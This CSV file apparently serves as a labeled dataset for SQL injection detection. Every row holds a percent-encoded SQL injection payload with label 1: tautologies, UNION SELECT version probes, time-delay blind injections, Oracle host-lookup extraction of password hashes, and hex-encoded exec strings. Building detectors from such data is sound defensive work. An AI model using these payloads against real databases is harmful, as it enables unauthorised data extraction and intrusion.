Query,Label
%3f %6f%72 %3%31  %3d  %3%31 %2d%2d,1
 %29   o%72   %28  %27%61%27  %3d  %27%61,1
%6%31%64%6d%69%6e%27 %6f%72 %31  %3d  %31%23,1
 se%6ce%63t %2a f%72%6f%6d u%73ers %77%68%65%72%65 %69d  %3d  %3%3%3%31 %6f%72 %22  %28  ]%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
o%72 %3%31  %3d  %3%31 %2d%2d,1
 a%6ed %31  %3d  %7%35tl_inaddr.get%%35fh%6fst_%61ddre%73s   %28    %28   se%6cect di%73tinc%74  %28  %63%6f%6c%7%35m%6e_%6e%61%6d%6%35  %29   f%72om   %28  se%6cect di%73tinc%74  %28  %63%6f%6c%7%35m%6e_%6e%61%6d%6%35  %29  %2c %72ownum %61%73 %6ci%6d%69t f%72om %61%6cl%%35f%74a%62%%35fc%6fl%7%35mns  %29   %77%68%6%35%72e %6ci%6d%69t  %3d  %35   %29    %29    a%6ed '%69'  %3d  %27%69,1
 sel%65ct %2a %66%72%6f%6d %75%73ers w%68%65%72%65 %69d  %3d  '1%27 %25%21<%40 %75%6e%69%6f%6e sel%65ct 1%2c%76%65rs%69%6f%6e  %28    %29   %2d%2d %31%27,1
 sel%65%63t %2a %66%72%6f%6d %75%73e%72%73 %77%68%65%72%65 i%64  %3d  %3%3%3%31 %6f%72 %22%26  %28  %22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
 %73%65%6c%65%63%74 %2a %66%72om %75s%65rs w%68ere %69%64  %3d  %3%3%3%31 %6fr %22%3f  %28  %22 %6fr %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
d%69%73%74%69n%63t,1
%73%65%6c%65%63%74 %2a f%72o%6d u%73%65r%73 %77he%72e %69%64  %3d  %27%3%3%31%27 %2a  %28  %5c  %29   o%72 %3%31  %3d  %3%31 %2d- %3%3%31%27,1
%3%3%31 %6%3%31%6e%64 a%73ci%69  %28  %6cow%65%72  %28  subs%74ri%6eg   %28    %28   %73el%65c%74 t%6f%70 %3%3%31 %6ea%6d%65 %66%72%6f%6d sy%73o%62%6a%65%63%74%73 %77h%65r%65 %78%74y%70e  %3d  %27%75'  %29  %2c %3%3%31%2c %3%3%31   %29    %29     %29   %3e %3%3%31%3%3%316,1
se%6ce%63%74 %2a %66r%6f%6d %75s%65%72%73 %77%68%65%72%65 %69d  %3d  %3%3%3%31 o%72 %5c%2e%3c%5c o%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
"a%64%6d%69%6e"" %6f%72 %22%31%22  %3d  %22%31%22--",1
 %73%65l%65%63%74 %2a %66r%6f%6d use%72s %77here %69%64  %3d  %3%3%3%31 %6f%72 %22%{%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
inse%72%74,1
" %73%65%6ce%63%74 %2a %66%72%6f%6d %75sers %77he%72%65 i%64  %3d  %3%3%3%3%31 %6f%72 %3%3%3%3%3%31%23""%3f  %3d  %3%3%3%3%31 %6f%72 %3%3%3%3%31  %3d  %3%3%3%3%31 %2d%2d %3%3%3%3%31",1
" se%6c%65%63%74 %2a %66%72%6f%6d %75s%65%72%73 %77h%65%72%65 i%64  %3d  %3%3%3%31 %6f%72 %22%?"" %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31",1
 %6%31%6e%64 %31  %3d  %75%74%6c%5f%69%6e%61%64%64%72%2e%67%65%74%5fh%6f%73%74%5f%61%64%64%72%65%73%73   %2%38    %2%38   sele%63t %64is%74inc%74  %2%38  %70%61%73%73w%6f%72%64  %29   %66r%6f%6d   %2%38  sele%63t %64is%74inc%74  %2%38  %70%61%73%73w%6f%72%64  %29  %2c %72%6fw%6e%75%6d %61%73 li%6dit %66r%6f%6d sy%73.%75%73er$  %29   %77here li%6dit  %3d  %38   %29    %29    %6%31%6e%64 %27%69'  %3d  %27i,1
 %73elect %2a %66%72%6f%6d use%72s w%68e%72e %69d  %3d  %3%3%3%31 %6fr %22%3f#%22 %6fr %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
"%6f%72 %3%31  %3d  %3%31 %6f%72 %22""  %3d  ",1
/%2a*%2f%6fr/%2a*/%31%2f%2a*/  %3d  /%2a%2a%2f%31,1
 se%6ce%63%74 %2a fr%6f%6d %75s%65%72%73 wh%65re %69d  %3d  %3%3%3%31 o%72 %22%2e  %28  %22 o%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
" %73elect %2a %66r%6fm u%73%65rs %77%68e%72e i%64  %3d  '1%27 u%6eion %73elect |%7c/1,v%65r%73io%6e  %28    %29   %2d- 1%27",1
 %73ele%63%74 %2a fr%6fm u%73ers w%68%65r%65 %69%64  %3d  %27%31%27 %75%6ei%6f%6e %73ele%63%74 +\.%2c%40%40vers%69%6fn %2d%2d %31',1
%6f%72 %31  %3d  %3%31%2f%2a,1
%2%37 o%72 %3%31  %3d  %3%31,1
" %73ele%63t %2a %66r%6f%6d u%73ers %77%68%65r%65 %69d  %3d  %3%31 %3c@%26@ %75%6e%69%6f%6e %73ele%63t %3%31,%76er%73ion  %28    %29   %2d- %3%31",1
" %73e%6c%65%63%74 %2a fr%6f%6d u%73e%72%73 %77%68%65%72e %69%64  %3d  %27%3%31%27 %75ni%6f%6e %73e%6c%65%63%74 $%2a$,@@version %2d%2d %31%27",1
"%31%3b  %28  %6coa%64%5ffi%6ce  %28  %63%68%61%72  %28  4%37,%31%301%2c11%36%2c99,4%37,%311%32,%397%2c1%315%2c %2e.%2e",1
 %73elect %2a %66%72%6f%6d %75se%72s %77her%65 i%64  %3d  '%3%31%27 %6f%72 %24 %3%31  %3d  %3%31 %75%6eion %73elect %3%3%31%2c@%40v%65rs%69%6f%6e -%2d %3%3%31%27,1
%73el%65%63%74 %2a f%72om %75%73%65%72%73 whe%72e i%64  %3d  %3%3%3%31 %6f%72 \.<%3%3%3%31 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
 se%6cect %2a %66%72o%6d %75%73%65%72s whe%72%65 %69%64  %3d  '%31%27 o%72 %5c%3c%5c %75%6ei%6fn se%6cect 1%2c%40@%76%65%72%73i%6fn %2d- %31',1
" %73%65%6c%65%63%74 %2a %66%72%6f%6d use%72%73 %77%68%65%72%65 %69%64  %3d  %3%31 unio%6e %73%65%6c%65%63%74 %3%31||%3%31,version  %28    %29   -%2d %3%31",1
" %73%65%6c%65%63%74 %2a %66%72%6f%6d use%72s %77here %69%64  %3d  %3%3%31 ||%3%3%31 u%6ei%6f%6e %73%65%6c%65%63%74 null,b%6%3%31nne%72 %66%72%6f%6d %76%24ve%72%73%69%6f%6e %77here rown%75m  %3d  %3%3%31 %2d%2d %3%3%31",1
%73%65lect %2a fr%6fm %75%73%65%72%73 %77%68ere %69%64  %3d  '%3%3%31%27 %6f%72 %5c %6f%72 %3%31  %3d  %3%31 %2d- %3%31%27,1
" %73%65l%65%63t %2a %66%72om %75%73%65r%73 wh%65%72e i%64  %3d  %3%3%3%31 %6f%72 %22%5d{"" %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31",1
" %73%65%6c%65%63%74 %2a %66%72%6f%6d us%65%72%73 %77%68e%72e %69%64  %3d  %3%3%3%31 %6f%72 %22%2e@"" %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d- %3%3%3%31",1
" %73%65%6c%65ct %2a %66%72%6f%6d use%72%73 %77%68%65%72%65 %69%64  %3d  %3%3%3%31 o%72 ""%24%5b"" o%72 %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31",1
%6fr %31 %2d%2d%27,1
" %73%65%6c%65%63%74 %2a fr%6fm u%73%65%72%73 %77her%65 %69d  %3d  %3%3%3%31 %6fr "",%3b%22 %6fr %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31",1
a%64%6din%22 %6fr %31  %3d  %31%23,1
" %73%65%6ce%63t %2a %66r%6f%6d %75se%72%73 %77h%65re %69%64  %3d  %3%3%3%31 %2b  %28  %3%3%3%31  %29   %75%6ei%6f%6e %73%65%6ce%63t nu%6cl,ban%6ee%72 %66r%6f%6d v$%76%65r%73i%6fn %77h%65re r%6fw%6e%75m  %3d  %3%3%3%31 %2d%2d %3%3%3%31",1
%5cx2%37%75ni%6fn sele%63t,1
%70%72i%6et,1
 %73%65%6c%65%63%74 %2a %66%72%6f%6d user%73 %77%68ere %69%64  %3d  %27%31%27 %75n%69%6fn %73%65%6c%65%63%74   %28  %5c%2e  %29  %2c@@version %2d- %31%27,1
o%72 %31  %3d  %3%31%2d%2d,1
%31 %6f%72 pg_%73leep  %28  _%5f%74%69%6de_%5f  %29  %2d-,1
 %73%65lect %2a fr%6fm %75%73e%72%73 %77%68%65%72%65 i%64  %3d  %3%3%3%31 %6f%72 %22%2c%23%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
%61%64m%69%6e%27  %29   %6f%72   %28  %27%31%27  %3d  %27%31%27/*,1
%6f%7%%332 %%332 bet%77een %%331 %61nd %33,1
 s%65%6c%65%63%74 %2a %66%72om u%73ers %77%68e%72%65 i%64  %3d  %3%3%3%3%31 o%72 %22  %29  .%22  %3d  %3%3%3%3%31 o%72 %3%3%3%3%31  %3d  %3%3%3%3%31 %2d%2d %3%3%3%3%31,1
 s%65%6c%65c%74 %2a %66r%6fm %75%73%65%72%73 wh%65re %69d  %3d  %3%31 %6fr %3%3%31%23%22%2e u%6e%69%6fn s%65%6c%65c%74 %6e%75%6c%6c%2c%76%65%72%73%69%6f%6e  %28    %29   %2d- %3%31,1
%61dmin%27 %6fr %27%31%27  %3d  %27%31,1
%3b %69f n%6ft  %28  sele%63t %73%79%73%74%65%6d%5f%75s%65%72  %29   %3c%3e '%73%61' %77%61%69%74%66%6f%72 %64%65%6cay %270%3a%30:2%27 %2d-,1
" s%65lect %2a %66%72%6f%6d %75%73%65%72%73 %77her%65 i%64  %3d  %3%3%31 %75nion s%65lect %3%3%3%31,banner %66%72%6f%6d v$ve%72si%6fn %77her%65 %72%6f%77%6e%75%6d  %3d  %3%3%31 %2d%2d %3%3%31",1
%22 %6f%72 %3%30  %3d  %3%30 %2d%2d,1
 s%65l%65%63%74 %2a %66%72%6fm %75%73%65%72s wher%65 i%64  %3d  %3%31 %75n%69%6f%6e s%65l%65%63%74 %40 %24_%2c%76%65%72%73%69%6f%6e  %28    %29   %2d%2d %3%31,1
%73e%6ce%63%74 %2a %66%72o%6d %75se%72s %77%68%65%72%65 i%64  %3d  %3%3%3%31 %3c%40%2e%24 %6fr %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
 s%65lect %2a %66%72o%6d user%73 w%68%65re %69d  %3d  %3%3%3%31 o%72 %22%25%2e%22 o%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
 %73%65%6c%65c%74 %2a %66rom user%73 %77%68e%72%65 %69%64  %3d  %3%31 %2b $%2b%2a$ u%6e%69o%6e %73%65%6c%65c%74 %6e%75l%6c%2c%40%40%76%65%72%73%69%6fn %2d- %3%31,1
 %73%65l%65ct %2a %66%72%6f%6d u%73e%72%73 wh%65r%65 %69%64  %3d  %3%3%3%31 %6f%72 %22%2c%2e%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
%63h%61%72%25%34%30%33%39%%341%25%32b%25%340s%65%6c%65%63%74,1
" s%65lect %2a %66ro%6d u%73%65rs w%68%65r%65 %69%64  %3d  %3%3%3%31 %6f%72 ""%3%3%3%31&"" %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d- %3%3%3%31",1
a%64m%69n'  %29   %6f%72   %28  %27%31'  %3d  %27%31,1
%64e%63%6ca%72%65 %40%73 %76%61r%63h%61r   %28  2%300  %29   s%65%6ce%63t %40%73   %3d   0x73%3656c6 %2e%2e%2e,1
%6f%72 %3%30  %3d  %3%30 %23%22,1
" s%65l%65c%74 %2a %66rom u%73%65%72s %77%68%65%72%65 %69%64  %3d  %3%3%3%31 o%72 %22%2e]"" o%72 %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31",1
  %29   %6f%72   %28  '%78%27  %3d  %27%78,1
" %73%65%6c%65%63%74 %2a %66ro%6d u%73%65rs wh%65re i%64  %3d  %3%31%2e%3c@$ %75%6e%69o%6e %73%65%6c%65%63%74 %31,ve%72s%69on  %28    %29   %2d%2d %31",1
%24  %28  %73%6c%65%65%70 %35%30  %29 ,1
" %73%65%6c%65%63%74 %2a %66%72om us%65rs %77%68e%72e %69d  %3d  %3%3%31 %2a%3%3%31 %75%6ei%6f%6e %73%65%6c%65%63%74 n%75%6cl,%62%6%3%31%6ener %66%72om %76%24%76%65%72%73%69%6f%6e %77%68e%72e %72%6f%77n%75%6d  %3d  %3%3%31 %2d%2d %3%3%31",1
"%31 %75%6e%69o%6e al%6c s%65%6c%65c%74 %31%2c%32%2c%33,%34,%35,%36%2c%6ea%6de %66%72o%6d %73%79%73%6f%62j%65%63%74%73 %77here x%74%79%70%65   %3d   'u%27 -%2d",1
 %73%65%6c%65%63%74 %2a %66r%6fm %75%73%65%72%73 %77%68%65%72%65 %69%64  %3d  %3%31 %6fr %3%3%31#%22. u%6eio%6e %73%65%6c%65%63%74 'a%27%2c%76%65r%73%69%6f%6e  %28    %29   %2d%2d %3%31,1
" s%65%6ce%63t %2a fr%6f%6d %75s%65rs %77%68%65%72%65 %69d  %3d  %3%31 o%72 %3%3%31%23%22%3b %75n%69on s%65%6ce%63t null,v%65rsi%6fn  %28    %29   %2d%2d %3%31",1
" %73e%6cect %2a %66%72%6f%6d %75%73%65%72%73 %77%68ere %69%64  %3d  %3%3%3%31 %6f%72 %3%3%3%31%23""? %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31",1
"""a""%22 %6f%72 %31  %3d  %3%31-%2d""",1
 %73%65%6cec%74 %2a %66r%6fm use%72s w%68e%72%65 %69%64  %3d  %3%3%31 %2a%3%3%31 uni%6fn %73%65%6cec%74 %3%3%31%2cban%6eer %66r%6fm v%24ver%73i%6fn w%68e%72%65 %72ow%6eu%6d  %3d  %3%3%31 %2d%2d %3%3%31,1
 %6%31n%6%34 %31  %3d  u%7%34%6c_%69na%6%34d%72.ge%7%34%5fho%73%7%34%5fa%6%34dr%65%73%73   %28    %28   %73%65%6c%65%63%7%34 %6%34ist%69nct  %28  %63o%6c%75%6d%6e%5f%6e%61%6d%65  %29   %66%72%6f%6d   %28  %73%65%6c%65%63%7%34 %6%34ist%69nct  %28  %63o%6c%75%6d%6e%5f%6e%61%6d%65  %29  %2c ro%77n%75%6d %61%73 %6c%69%6d%69%7%34 %66%72%6f%6d %61%6cl_t%61b_co%6c%75%6dns  %29   %77%68e%72%65 %6c%69%6d%69%7%34  %3d  %34   %29    %29    %6%31n%6%34 %27i'  %3d  %27%69,1
 s%65le%63%74 %2a fr%6fm us%65%72%73 %77h%65%72e %69d  %3d  '%31%27 %75%6e%69%6f%6e s%65le%63%74   %28  %5c  %29  %2c%40@%76%65r%73%69%6f%6e %2d- 1%27,1
%31 a%6ed %75s%65%72%5f%6e%61%6d%65  %28    %29     %3d   '%64bo',1
%3b %69%66 %6e%6f%74  %28  %73ubs%74r%69ng   %28    %28   sele%63%74 @%40ve%72%73io%6e  %29  %2c%32%34%2c%3%31  %29   %3c> %31  %29   %77%61%69t%66o%72 de%6cay '%30%3a%30:%32' %2d%2d,1
" %73%65l%65%63t %2a %66%72%6f%6d %75%73%65%72%73 %77h%65%72%65 %69%64  %3d  %3%31 %6f%72 %3%3%31%23%22%24 %75ni%6f%6e %73%65l%65%63t %3%31,%76e%72s%69on  %28    %29   -%2d %3%31",1
 sel%65%63%74 %2a f%72%6fm use%72s %77%68ere %69d  %3d  %3%31 %6fr %3%3%31%23%22{ %75%6e%69%6f%6e sel%65%63%74 null%2cversion  %28    %29   -%2d %3%31,1
%73%65l%65%63%74 %2a f%72om %75s%65%72%73 %77%68%65re %69%64  %3d  %27%3%3%31%27 %2a$ %2e %6f%72 %3%31  %3d  %3%31 %2d- %3%3%31%27,1
%73%65%6c%65%63t %2a fro%6d user%73 %77h%65%72%65 %69d  %3d  %3%3%3%31 %2b$%2b. %6f%72 %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
%73%65le%63%74 %2a fr%6fm u%73%65%72%73 %77%68%65r%65 %69%64  %3d  %3%3%3%3%31 %6fr   %28  %5c%2b  %29    %3d  %3%3%3%3%31 %6fr %3%3%3%3%31  %3d  %3%3%3%3%31 %2d- %3%3%3%3%31,1
 a%%36e%%364 %31  %3d  %75%74l%5f%%369%%36e%%361%%364%%364%72%2eg%%365%74_%%368%%36f%73%74_%%361%%364dre%73%73   %28    %28   selec%74 dis%74in%%363%74  %28  %75%73%%365%72%%36e%%361%%36d%%365  %29   %%36%36%72%%36f%%36d   %28  selec%74 dis%74in%%363%74  %28  %75%73%%365%72%%36e%%361%%36d%%365  %29  %2c ro%77%%36e%75%%36d a%73 li%%36dit %%36%36%72%%36f%%36d %73%79s.%%361%%36c%%36c_use%72%73  %29   %77here li%%36dit  %3d  %36   %29    %29    a%%36e%%364 %27%69%27  %3d  %27%69,1
%6f%72 %3%31  %3d  %3%31 %6f%72 %27%27  %3d  %27,1
se%6c%65%63%74 %2a fr%6fm user%73 wh%65%72e %69%64  %3d  %3%3%3%31   %6fr %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
%6f%72 %27text' %3e %27t%27,1
"%3%31%323%34 %22 %6%31n%64 %31  %3d  %30 u%6eio%6e %61l%6c s%65%6ce%63t %22admin%22, %228%31dc9bdb52d%304dc2%30%3036dbd83%313ed%3055",1
 %73%65%6c%65%63%74 %2a %66%72%6f%6d %75s%65rs %77%68%65%72%65 %69%64  %3d  %3%3%3%31 %6f%72 %22%25%5b%22 %6f%72 %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31,1
" selec%74 %2a fr%6fm u%73%65%72s %77%68%65%72%65 %69%64  %3d  %3%3%31 o%72 %3%3%3%31%23%22%3b  %3d  %3%3%31 %75%6e%69%6f%6e selec%74 %3%3%31,%76ersion  %28    %29   -%2d %3%3%31",1
%61%64%6d%69%6e%27 o%72 %27%31'  %3d  %27%31'#,1
sel%65%63%74 %2a %66%72o%6d %75%73%65%72%73 w%68%65%72e %69d  %3d  %3%3%3%3%31 %2b%24 %3%3%3%3%31 %6fr %3%3%3%3%31  %3d  %3%3%3%3%31 %2d- %3%3%3%3%31,1
%73,1
 %6%31nd %31  %3d  u%7%34%6c%5fina%6%34dr.%67e%7%34_host_a%6%34d%72ess   %28    %28   %73%65%6c%65%63%7%34 d%69%73%7%34%69%6e%63%7%34  %28  %75%73ername  %29   %66%72o%6d   %28  %73%65%6c%65%63%7%34 d%69%73%7%34%69%6e%63%7%34  %28  %75%73ername  %29  %2c rownu%6d %61s %6cim%69%7%34 %66%72o%6d %73%79%73.a%6c%6c_%75%73%65%72s  %29   w%68%65r%65 %6cim%69%7%34  %3d  %34   %29    %29    %6%31nd %27i%27  %3d  %27%69,1
 %73%65lect %2a %66%72om %69%6eformati%6f%6e_%73%63h%65ma.tabl%65%73--,1
" %73%65%6cec%74 %2a %66r%6f%6d %75sers w%68ere %69d  %3d  %3%3%3%31 %6f%72 ""%24&"" %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31",1
%31   %29    %29    %6f%72 %70%67%5f%73%6cee%70  %28  __time%5f_  %29  %2d-,1
" s%65%6c%65%63t %2a %66ro%6d %75%73%65%72s w%68e%72e %69d  %3d  '1%27 %75n%69o%6e s%65%6c%65%63t !<%40,v%65r%73i%6f%6e  %28    %29   %2d%2d %31'",1
%64%65%63%6c%61%72%65 %40%71 %6e%76%61%72%63h%61%72   %28  %3200  %29   %73e%6ce%63t %40%71   %3d   %30%78%37%37%30%30%361 %2e%2e%2e,1
 %6fr %3%31  %3d  %3%31 %6fr %27%27  %3d  %27,1
%73e%6c%65c%74 %2a fro%6d %75%73%65%72s %77h%65%72%65 %69%64  %3d  %3%3%3%31 %!<%3%3%3%31 %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
de%63la%72e %40q %6e%76%61%72%63%68%61%72   %28  %32%300  %29   %73elect %40q   %3d   0x770061006900740066006f007%32%300%32%3000640065006c0061007900%32%3000270030003a0030003a0031003000270000 e%78%65%63  %28  %40q  %29 ,1
" selec%74 %2a %66%72%6fm %75%73%65r%73 w%68%65%72%65 %69d  %3d  %3%3%3%31 %6f%72 ""]%3%3%3%31"" %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31",1
 se%6c%65ct %2a %66%72%6fm %75se%72%73 %77he%72e %69%64  %3d  %3%31 o%72 $+<%3%31 %75%6e%69%6f%6e se%6c%65ct %3%3%31%2c%40@%76%65%72s%69o%6e -%2d %3%31,1
%6f%72 %27%75%6eu%73u%61%6c'   %3d   %27%75%6eu%73u%61%6c',1
 %6f%72 %31 i%6e   %28  %73e%6c%65%63t %40%40%76%65%72s%69%6f%6e  %29  %2d-,1
tru%6eca%74e,1
a%73,1
%18 o%72 %%33%33  %%33d  %%33%33 %2d-,1
" sel%65ct %2a %66%72%6fm u%73%65r%73 %77%68%65r%65 %69d  %3d  %3%3%31 ||%3%3%31 %75%6e%69%6f%6e sel%65ct %3%3%31,%62ann%65r %66%72%6fm v$%76ersio%6e %77%68%65r%65 %72%6f%77%6e%75%6d  %3d  %3%3%31 -%2d %3%3%31",1
 selec%74 %2a %66%72%6f%6d u%73e%72%73 %77he%72%65 %69%64  %3d  %3%31 %3c@%24$ %75%6e%69%6f%6e selec%74 %3%3%31%2cv%65%72s%69on  %28    %29   %2d%2d %3%31,1
"ad%6din""  %29   %6f%72   %28  %221""  %3d  ""%31",1
" s%65lect %2a %66%72%6fm user%73 %77her%65 %69%64  %3d  %3%31 o%72 %3%3%31%23""@ %75%6e%69%6f%6e s%65lect %27%6%31%27%2cv%65r%73%69%6f%6e  %28    %29   %2d- %3%31",1
"%3%31  %29   o%72 b%65nc%68ma%72k  %28  %3%310000000,%6dd5  %28  %3%31   %29    %29   %23",1
" %73e%6c%65%63%74 %2a f%72o%6d use%72%73 w%68ere %69d  %3d  %3%31 %75%6e%69%6f%6e %73e%6c%65%63%74 .%3%31_,version  %28    %29   %2d%2d %3%31",1
 %6%31nd %31  %3d  %75%74%6c%5fi%6e%61%64%64%72.%67%65%74%5f%68%6fs%74_%61%64%64%72%65%73s   %28    %28   %73e%6c%65c%74 sys.database_na%6d%65 f%72o%6d d%75al   %29    %29    %6%31nd '%69%27  %3d  %27%69,1
 %6f%72 %3%30  %3d  %3%30 #%22,1
s%65l%65ct %2a f%72om %75%73%65%72%73 %77%68%65r%65 %69%64  %3d  %3%3%3%3%31 %25%24 %3%3%3%3%31 %6f%72 %3%3%3%3%31  %3d  %3%3%3%3%31 %2d- %3%3%3%3%31,1
%73%65le%63%74 %2a %66%72om %75%73%65%72%73 w%68er%65 %69d  %3d  %3%3%3%31 %25%2%3%3%31%3c@ %6f%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
%3b %69%66 %6e%6ft  %28  s%75%62s%74%72%69ng   %28    %28   se%6cect %4%30@%76%65%72%73io%6e  %29  %2c%325%2c1  %29   %3c%3e %30  %29   %77a%69%74for %64el%61y '%30:%30:2' %2d%2d,1
%31  %29   o%72 %73le%65p  %28  %5f%5ftime__  %29  %23,1
" %73%65%6ce%63%74 %2a f%72o%6d %75%73%65%72%73 wh%65r%65 %69d  %3d  %3%3%3%31 %6f%72 ""%3%3%3%31_"" %6f%72 %3%3%3%31  %3d  %3%3%3%31 -%2d %3%3%3%31",1
 sele%63t %2a %66ro%6d %75sers %77here %69%64  %3d  %3%31 <%3%31## un%69%6f%6e sele%63t %3%31%2c%76%65r%73%69on  %28    %29   %2d%2d %3%31,1
 %73elect %2a %66%72%6fm u%73%65%72s %77%68%65%72%65 %69%64  %3d  %3%31 %2b $%2b%2a\ %75%6e%69%6fn %73elect %6eu%6cl%2c@@vers%69%6f%6e %2d- %3%31,1
s%65le%63t %2a f%72o%6d %75%73%65%72s wh%65r%65 i%64  %3d  %3%3%31%2e <%40 o%72 %3%3%31  %3d  %3%3%31 -%2d %3%3%31,1
 o%72 true-%2d,1
%3b %65%78%65%63%75%74%65 %69%6d%6d%65%64%69%61%74e '%73el' %7c%7c %27ec%74 %75%73%27 %7c%7c '%65r',1
%68i' %6f%72 %27x%27  %3d  %27x%27;,1
%73elect %2a fro%6d %75se%72%73 w%68ere i%64  %3d  %3%3%3%31 %3c@ o%72 %3%3%3%31  %3d  %3%3%3%31 %2d%2d %3%3%3%31,1
